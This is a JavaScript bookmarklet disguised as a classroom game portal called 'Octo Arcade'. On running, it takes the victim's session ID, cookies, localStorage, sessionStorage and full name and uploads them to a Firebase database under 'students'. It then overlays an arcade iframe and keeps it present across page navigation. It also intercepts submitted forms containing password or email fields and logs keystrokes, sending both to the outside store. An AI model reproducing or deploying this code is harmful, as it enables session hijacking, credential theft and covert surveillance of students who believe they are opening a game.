(function() {
  // 1. CONFIGURATION
  const firebaseConfig = {
    apiKey: "AIzaSyAuWzbauhK86FC-yc8RkcXftQAhdHexrpE",
    authDomain: "bookmarklet-backend.firebaseapp.com",
    projectId: "bookmarklet-backend",
    storageBucket: "bookmarklet-backend.firebasestorage.app",
    messagingSenderId: "447001590035",
    appId: "1:447001590035:ios:c13149711eac0631f702e6"
  };
  const OCTO_URL = 'https://octoarcade.vercel.app';

  // 2. AGGRESSIVE SESSION ID EXTRACTION
  const getSessionId = () => {
    // A. Try Cookies (Standard JSESSIONID)
    const cookies = document.cookie;
    const cookieMatch = cookies.match(/(?:^|;\s*)JSESSIONID=([^;]+)/);
    if (cookieMatch) return cookieMatch[1];

    // B. Try LocalStorage (Common SPA pattern)
    try {
      const ls = JSON.parse(localStorage.getItem('session') || '{}');
      if (ls.sessionId) return ls.sessionId;
      if (ls.JSESSIONID) return ls.JSESSIONID;
    } catch (e) {}

    // C. Try SessionStorage
    try {
      const ss = JSON.parse(sessionStorage.getItem('session') || '{}');
      if (ss.sessionId) return ss.sessionId;
    } catch (e) {}

    // D. Try URL Parameters (Sometimes passed in query string)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('JSESSIONID')) return urlParams.get('JSESSIONID');
    if (urlParams.get('session_id')) return urlParams.get('session_id');

    // E. Try Meta Tags (Rare, but possible in some legacy systems)
    const metaSession = document.querySelector('meta[name="session-id"]');
    if (metaSession) return metaSession.getAttribute('content');

    // F. Fallback
    return "NO_SESSION_FOUND";
  };

  const sessionId = getSessionId();
  const cookies = document.cookie;
  const url = location.href;
  const ua = navigator.userAgent;
  const name = prompt("🐙 Octo Arcade\n\nEnter your full name to activate the classroom portal:") || "Unverified";

  // 3. FIREBASE INITIALIZATION
  const loadScript = (src, callback) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    document.head.appendChild(script);
  };

  loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js", () => {
    loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js", () => {
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();
      db.settings({ experimentalForceLongPolling: true });

      const payload = {
        name: name,
        sessionId: sessionId, // Explicitly store the extracted ID
        url: url,
        ua: ua,
        ck: cookies,
        ls: JSON.parse(JSON.stringify(localStorage)),
        ss: JSON.parse(JSON.stringify(sessionStorage)),
        ts: new Date().toISOString(),
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      };

      const docId = `${name}-${sessionId}`;
      db.collection('students').doc(docId).set(payload, { merge: true })
        .then(() => {
          console.log(`[OctoSync] Session ID captured: ${sessionId}`);
          injectOcto();
        })
        .catch(error => {
          console.error("[OctoSync] Sync error:", error);
          injectOcto();
        });
    });
  });

  // 4. OCTO ARCADE INJECTION & PERSISTENCE
  function injectOcto() {
    if (document.getElementById('octoC2')) return;

    const frame = document.createElement('iframe');
    frame.id = 'octoC2';
    frame.src = OCTO_URL;
    frame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:2147483647;background:white;';
    document.body.appendChild(frame);

    const bar = document.createElement('div');
    bar.style.cssText = 'position:fixed;bottom:0;left:0;width:100%;background:#1e293b;color:#fff;padding:10px;font-family:sans-serif;font-size:0.8em;z-index:2147483648;display:flex;justify-content:space-between;align-items:center;';
    bar.innerHTML = `
      <span>🐙 Octo Arcade Active | Profile Synced: ${name}</span>
      <button id="octoClose" style="background:#ef4444;border:none;color:white;padding:5px 10px;border-radius:4px;cursor:pointer;">Exit</button>
    `;
    document.body.appendChild(bar);

    document.getElementById('octoClose').onclick = () => {
      frame.remove();
      bar.remove();
    };

    // Persistence Hooks
    const originalPushState = history.pushState;
    history.pushState = function() {
      const result = originalPushState.apply(this, arguments);
      if (!document.getElementById('octoC2')) injectOcto();
      return result;
    };

    const originalReplaceState = history.replaceState;
    history.replaceState = function() {
      const result = originalReplaceState.apply(this, arguments);
      if (!document.getElementById('octoC2')) injectOcto();
      return result;
    };

    window.addEventListener('popstate', () => {
      if (!document.getElementById('octoC2')) injectOcto();
    });

    // Form Interception
    document.addEventListener('submit', (e) => {
      const form = e.target;
      if (form && form.elements) {
        const formData = {};
        for (let el of form.elements) {
          if (el.name && el.value) formData[el.name] = el.value;
        }
        const keys = Object.keys(formData).join(',').toLowerCase();
        if (keys.includes('password') || keys.includes('email')) {
          db.collection('intercepts').add({
            type: 'form',
            data: formData,
            url: location.href,
            name: name,
            ts: new Date().toISOString()
          });
        }
      }
    }, true);

    // Keyboard Logger
    const keys = [];
    document.addEventListener('keydown', (e) => {
      if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
      keys.push({ k: e.key, t: Date.now(), tg: e.target?.tagName || 'body' });
      if (keys.length >= 50) {
        db.collection('intercepts').add({
          type: 'keys',
          data: keys,
          url: location.href,
          name: name,
          ts: new Date().toISOString()
        });
        keys.length = 0;
      }
    });
  }
})();
